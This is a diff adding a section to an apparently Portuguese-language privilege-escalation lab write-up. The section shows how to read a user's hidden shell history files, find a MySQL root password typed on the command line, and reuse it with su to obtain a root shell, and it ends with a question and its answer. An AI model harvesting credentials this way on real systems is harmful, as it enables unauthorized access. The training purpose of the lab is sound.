@@ -774,3 +774,42 @@ Agora, executa-se o /tmp/rootbash com -p para obter um shell rodando com privil�
 ### Questões:
 
 - a. ***Read and follow along with the above.*** *Não há necessidade de resposta*
+
+## 16 - Passwords & Keys - History Files 
+
+Se um usuário digitar acidentalmente sua senha na linha de comando em vez de em um prompt de senha, ela poderá ser gravada em um arquivo de histórico.
+
+Visualize o conteúdo de todos os arquivos de histórico ocultos no diretório inicial do usuário:
+
+```shell
+user@debian:~$ cat ~/.*history | less
+
+ls -al
+cat .bash_history 
+ls -al
+mysql -h somehost.local -uroot -ppassword123
+exit
+cd /tmp
+clear
+ifconfig
+netstat -antp
+nano myvpn.ovpn 
+ls
+identify
+
+(END) 
+```
+
+Percebe-se que o usuário tentou se conectar a um servidor MySQL em algum momento, usando o nome de usuário "root" e uma senha enviada pela linha de comando. Observe que não há espaço entre a opção -p e a senha!
+
+Mude para o usuário root, usando a senha:
+
+```shell
+user@debian:~$ su root 
+Password: 
+root@debian:/home/user# 
+```
+
+### Questões:
+
+- a. ***What is the full mysql command the user executed?*** *mysql -h somehost.local -uroot -ppassword123*
